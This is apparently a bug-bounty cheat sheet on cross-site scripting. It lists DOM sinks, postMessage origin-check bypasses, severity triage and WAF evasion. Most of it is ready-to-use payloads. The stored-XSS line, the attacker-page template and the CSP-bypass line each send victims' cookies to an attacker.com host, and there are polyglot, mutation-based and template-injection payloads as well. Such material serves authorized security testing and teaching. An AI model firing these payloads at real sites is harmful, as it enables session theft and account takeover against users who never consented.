# XSS — Cross-Site Scripting

## Stored XSS (Highest Impact)
```
Input: "<script>document.location='https://attacker.com/c?c='+document.cookie</script>"
Any user viewing page executes attacker JS → cookie theft → session hijack
```

## DOM XSS Sinks (grep for these)
```javascript
innerHTML = userInput           // HIGH RISK
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)      // string form
element.src = userInput         // JavaScript URI possible
location.href = userInput
```

## postMessage Testing (DOM XSS via Cross-Frame)

> postMessage is a DOM XSS source — same sinks above become reachable when fed by `addEventListener("message", ...)` without proper `event.origin` validation.

### Vulnerable Pattern
```js
window.addEventListener("message", (e) => {
  // No e.origin check → any page can postMessage in
  document.getElementById("x").innerHTML = e.data
})
```

### Common Origin-Check Bypasses
| Weak check | Bypass | Example that passes |
|---|---|---|
| `e.origin.indexOf("trusted")` | substring anywhere | `https://trusted.attacker.com` |
| `e.origin.startsWith("https://trusted")` | suffix attack | `https://trusted.attacker.com` |
| `e.origin.endsWith(".trusted.com")` | infix attack | `https://evil-trusted.com` |
| `e.origin === "null"` | sandboxed iframe | `srcdoc`/`sandbox` iframe → origin literally `"null"` |
| Regex with unescaped `.` | `.` matches any char | `/https?:\/\/trusted\.com/` matches `https://trusted-com.evil.com` |
| No check at all | (just listen) | Any origin |

### Finding Listeners
```js
// DevTools console (Chromium)
getEventListeners(window).message
```
```bash
# Source grep
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" | grep -v node_modules
```

### Attacker Page Template
```html
<!-- Hosted on attacker.com -->
<iframe src="https://victim.com" id="v"></iframe>
<script>
  document.getElementById('v').onload = () => {
    document.getElementById('v').contentWindow.postMessage(
      '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>',
      '*'
    )
  }
</script>
```

### Chains That Pay
```
postMessage → innerHTML/eval sink → DOM XSS                          High
postMessage → OAuth code/state passing → code theft → ATO           Critical
postMessage → localStorage token override → session manipulation     High
postMessage → JSON deserialize sink (eval/Function) → RCE            Critical (rare)
```

### Triage
```
Listener missing origin check + reachable XSS sink (innerHTML/eval)   = High/Critical
Listener missing origin check + OAuth code/state flows through it     = Critical (ATO)
Listener present + origin check has substring/regex bypass            = same severity, PoC required
Listener present + strict equality on origin (=== exact match)        = N/A
Listener exists but only logs / no DOM mutation                       = Low/Info
```

## XSS Bypass Techniques
```javascript
// CSP bypass — unsafe-inline blocked
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// Angular template injection
{{constructor.constructor('alert(1)')()}}

// mXSS — mutation-based
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

## WAF Bypass for XSS
Run: `bughunter/tools/waf_encoder.py "<payload>" --class xss` for 20+ variants.
Try `<svg onload=eval(atob('...'))>` or `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` when `<script>` blocked.